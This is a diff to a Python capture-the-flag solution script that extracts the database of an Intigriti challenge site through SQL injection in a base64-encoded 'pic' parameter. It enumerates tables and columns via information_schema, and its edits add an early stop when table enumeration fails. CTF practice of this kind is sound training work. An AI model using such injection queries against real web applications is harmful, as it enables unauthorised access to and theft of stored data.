@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """Dump the Critter Gallery database through the base64-wrapped `pic` parameter."""
-import base64, re, sys, time, urllib.parse, urllib.request
+import base64, re, time, urllib.parse, urllib.request
 
 URL = "https://challenge-0926.challenges.intigriti.io/challenge.php"
 DESC = re.compile(r'<div class="desc[^"]*">(.*?)</div>', re.S)
@@ -23,6 +23,8 @@ if __name__ == "__main__":
     tables = query("group_concat(table_name) FROM information_schema.tables "
                    "WHERE table_schema=database()")
     print("tables  :", tables)
+    if not tables:                         # None = query failed, "" = parsed but matched nothing
+        raise SystemExit("table enumeration returned nothing — stopping rather than guessing")
     for table in tables.split(","):
         cols = query("group_concat(column_name) FROM information_schema.columns "
                      f"WHERE table_schema=database() AND table_name=0x{table.encode().hex()}")
